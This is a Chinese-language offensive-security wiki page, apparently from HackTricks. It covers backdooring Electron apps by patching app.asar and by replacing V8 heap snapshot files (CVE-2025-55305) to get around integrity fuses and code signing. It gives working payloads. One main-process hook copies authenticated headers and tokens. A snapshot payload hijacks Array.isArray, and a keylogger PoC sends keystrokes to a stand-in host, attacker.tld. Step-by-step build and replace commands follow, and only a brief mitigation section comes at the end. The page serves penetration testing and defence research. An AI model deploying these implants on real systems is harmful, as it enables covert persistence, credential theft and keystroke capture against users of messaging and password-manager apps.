# Electron 本地代码注入与 Snapshot 篡改

{{#include ../../banners/hacktricks-training.md}}

## Electron 本地代码注入

如果你能修改或插桩本地安装的 Electron 应用，就可能让它执行任意 JavaScript。参见：


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

有关本地 Node inspector 或 Chromium DevTools 调试界面，请参见 [Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)。

## Post-exploitation：ASAR/主进程植入

如果你获得了对 Electron 应用资源目录的**写入权限**，一个非常实用的 post-exploitation 手段是**修改 `app.asar`**（或它加载的 JS 入口点），然后等待用户重新启动应用。与仅限 renderer 的 XSS 不同，从**主进程**加载的代码会在应用的 **Node.js runtime** 中执行，因此通常可以访问**文件系统**、生成命令、hook Electron API，并检查经过身份验证的应用状态。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

典型工作流程：

1. 解压 `app.asar`，并从 `package.json`（`main`）或现有启动逻辑中找到实际的引导文件。
2. 在**主进程**中添加一个小型 loader（或添加 preload/主进程 hook），然后重新打包归档。
3. 等待应用再次启动，并在用户解锁桌面应用或完成身份验证后，使用植入程序捕获运行时数据。

最简引导补丁示例：

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

实际影响：

- **可信客户端数据窃取**：桌面应用为用户解密或加载数据后，implant 就能从运行时读取这些数据。因此，**E2EE messaging clients**（Signal/Slack/Mattermost）以及**保险库/secret managers**仍然是值得关注的 endpoint 层目标。
- **Session/token 滥用**：Electron implant 可以窃取应用 cookies、bearer tokens、request headers、workspace files，或运行中的客户端暴露的 repo credentials（例如经过认证的 VS Code extensions 或 Git integrations）。
- **受害者上下文 pivoting**：被打补丁的应用可以通过受害者工作站代理请求，复用受害者的 IP、TLS fingerprint 和应用 session，而不只是外传原始 tokens。

> [!NOTE]
> 如果目标启用了 **ASAR integrity** / **OnlyLoadAppFromAsar** 或强化的 Electron **fuses**，你可能需要使用其他本地代码加载原语（例如 fuse abuse 或 snapshot tampering）。有关更多本地 implant 选项和 fuse 详情，请参阅 macOS 专用注入页面。

## 通过 V8 heap snapshot tampering 实现本地后门（Electron/Chromium）– CVE-2025-55305

Electron 和基于 Chromium 的应用会在启动时反序列化预构建的 V8 heap snapshot（v8_context_snapshot.bin，以及可选的 browser_v8_context_snapshot.bin），以初始化每个 V8 isolate（main、preload、renderer）。历史上，Electron 的 integrity fuses 不会将这些 snapshots 视为可执行内容，因此它们避开了基于 fuse 的完整性强制措施和 OS code-signing 检查。因此，替换用户可写安装目录中的 snapshot，就能在应用内部隐蔽、持久地执行代码，而无需修改已签名的 binaries 或 ASAR。<sup>[[2]](#references)</sup>

要点
- 完整性缺口：EnableEmbeddedAsarIntegrityValidation 和 OnlyLoadAppFromAsar 会验证 ASAR 中的应用 JavaScript，但不会覆盖 V8 heap snapshots（CVE-2025-55305）。Chromium 同样不会对 snapshots 执行完整性检查。<sup>[[3]](#references)[[4]](#references)</sup>
- 攻击前提：能够在应用安装目录中本地写入文件。在 Electron 应用或 Chromium 浏览器安装于用户可写路径的系统上，这种情况很常见（例如 Windows 上的 %AppData%\Local；macOS 上则有条件地适用于 /Applications）。
- 影响：通过篡改一个常用内置功能（“gadget”），可靠地在任意 isolate 中执行攻击者的 JavaScript，从而实现持久化并规避 code-signing 验证。
- 受影响范围：Electron 应用（即使启用了 fuses）以及从用户可写位置加载 snapshots 的基于 Chromium 的浏览器。

无需构建 Chromium 即可生成恶意 snapshot
- 使用预构建的 electron/mksnapshot 将 payload JS 编译成 snapshot，并覆盖应用的 v8_context_snapshot.bin。<sup>[[5]](#references)[[6]](#references)</sup>

最小 payload 示例（通过强制崩溃来证明代码执行）
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

隔离区感知的 payload 路由（在 main 与 renderer 中运行不同代码）
- Main process 检测：Node 专属全局对象（如 process.pid、process.binding() 或 process.dlopen）在 main process isolate 中存在。
- Browser/renderer 检测：在 document 上下文中运行时，可使用 Browser 专属全局对象（如 alert）。

探测 main process Node 功能的一次性示例 gadget
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

渲染器/浏览器上下文数据窃取 PoC（例如 Slack）
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

操作流程
1) 编写 payload.js，用其覆盖常见内置函数（例如 Array.isArray），并可选择按 isolate 分支处理。
2) 不使用 Chromium 源码构建 snapshot：
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) 覆盖目标应用的 snapshot 文件：
   - v8_context_snapshot.bin（始终使用）
   - browser_v8_context_snapshot.bin（如果使用了 LoadBrowserProcessSpecificV8Snapshot fuse）
4) 启动应用；每当调用所选内置函数时，gadget 就会执行。

注意事项
- 绕过完整性检查/签名检查：代码签名检查不会将 snapshot 文件视为本机可执行文件，而且（历史上）Electron 的 fuses 或 Chromium 完整性控制也未覆盖这些文件。
- 持久化：替换用户可写安装目录中的 snapshot，通常会在应用重启后继续生效，且看起来像是经过签名的合法应用。
- Chromium 浏览器：同样的篡改方式也适用于安装在用户可写位置的 Chrome/衍生浏览器。Chrome 还有其他完整性缓解措施，但明确将物理本地攻击排除在其威胁模型之外。<sup>[[9]](#references)[[10]](#references)</sup>

检测与缓解措施
- 将 snapshot 视为可执行内容，并将其纳入完整性强制措施（CVE-2025-55305 修复）。
- 优先使用仅管理员可写的安装目录；建立 v8_context_snapshot.bin 和 browser_v8_context_snapshot.bin 的哈希基线并监控其变化。
- 检测早期运行时对内置函数的覆盖以及异常的 snapshot 变更；当反序列化后的 snapshot 与预期值不符时发出警报。

## References

- [1] [JS-Tap v3：使用 JavaScript 植入程序进行端点后利用](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [破坏代码完整性检查，在本地向 Signal、1Password、Slack 等植入后门](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Electron ASAR 完整性](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [V8 自定义启动 snapshot](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium：禁用未签名代码的加载（CIG）](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Chrome 安全常见问题：物理本地攻击不在范围内](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
